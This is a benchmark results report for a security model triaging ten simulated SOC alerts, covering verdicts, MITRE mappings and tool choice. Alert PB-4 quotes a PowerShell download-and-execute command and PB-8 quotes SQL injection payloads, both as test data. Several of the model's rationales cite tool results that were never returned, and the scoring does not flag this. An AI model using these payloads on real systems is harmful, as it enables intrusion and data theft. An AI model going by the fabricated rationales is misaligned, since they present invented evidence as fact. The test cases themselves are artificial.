# Playbook benchmark — `hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M`

Model: `hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M`  
Mode: **describe-only**  
Run started: 2026-05-06 02:36:40  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **80%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 10/10 (100%) |
| MITRE accuracy | 7/10 (70%) |
| Tool-selection accuracy | 5/10 (50%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 0 |
| p50 latency | 1.1 s |
| p95 latency | 1.3 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 7.6s |
| PB-2 | inci | PASS | PASS | PASS | FAIL | 1.1s |
| PB-3 | inci | PASS | PASS | PASS | PASS | 1.3s |
| PB-4 | inci | PASS | PASS | PASS | FAIL | 0.7s |
| PB-5 | inci | PASS | PASS | PASS | FAIL | 1.2s |
| PB-6 | inci | PASS | PASS | FAIL | FAIL | 1.1s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 0.9s |
| PB-8 | inci | PASS | PASS | FAIL | FAIL | 1.1s |
| PB-9 | inci | PASS | PASS | FAIL | PASS | 1.1s |
| PB-10 | inci | PASS | PASS | PASS | PASS | 1.1s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 7.59s · GPU 76%/20534MB · CPU 15% · RAM 33530MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "low",
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "The alert is about an internal user authenticating to the corporate intranet from a known laptop. The CMDB shows that the asset has criticality `medium` and tag `no-egress-allowed`. No other corroborating signals."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 1.12s · GPU 81%/9278MB · CPU 7% · RAM 32138MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1078.002"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The external IP 41.78.122.18 has a malicious verdict (score 88); the target hosts are all in PCI-scope; SIEM shows dom_admin_01 authenticating from a different geo 6 hours earlier \u2014 impossible travel."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=FAIL

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 1.32s · GPU 83%/9280MB · CPU 10% · RAM 32132MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The alert shows a large number of POST requests to the wp-login.php endpoint, which is often used for brute-force attacks. The source IP 89.248.165.74 has a malicious verdict (score 88), and the target host webhost is not tagged as no-egress-allowed or tier-0."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 0.71s · GPU 82%/9280MB · CPU 13% · RAM 32129MB

_Tool calls_:
```
- edr.get_processes(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059",
    "T1078"
  ],
  "tools_used": [
    "edr.get_processes"
  ]
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=FAIL

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 1.15s · GPU 82%/9280MB · CPU 16% · RAM 32106MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1071.004"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Internal host 10.0.4.55 is issuing a large volume of subdomain queries to an external domain with no known business use, and the responses are unusually small (200 bytes). This could be a DNS tunnel or data exfiltration attempt."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=FAIL

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 1.14s · GPU 82%/9280MB · CPU 14% · RAM 32140MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ]
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 0.88s · GPU 81%/9280MB · CPU 14% · RAM 32155MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "The alert is a routine sshd event on `webhost` (10.0.4.10) with no corroborating signals, so it's benign."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 1.07s · GPU 79%/9282MB · CPU 46% · RAM 32141MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059",
    "T1068"
  ],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "The alert shows SQL injection attempts against webhost (10.0.4.10), which is PCI-scope. The UNION SELECT request returned a 200 with a 4129-byte body, indicating that the query was successful."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 1.08s · GPU 79%/9282MB · CPU 14% · RAM 32130MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1548.001"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The alert shows a user with sudo rights modifying service-account permissions, which is unusual behavior for that account. SIEM logs show no other activity from the same TTY pts/3 in the last hour."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 1.06s · GPU 71%/9282MB · CPU 14% · RAM 32136MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078.002"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The source IP 192.168.50.13 is a workstation (KIOSK-04) with no admin-auth tag, and the SIEM shows 5 failed logons for Administrator in a short time frame."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
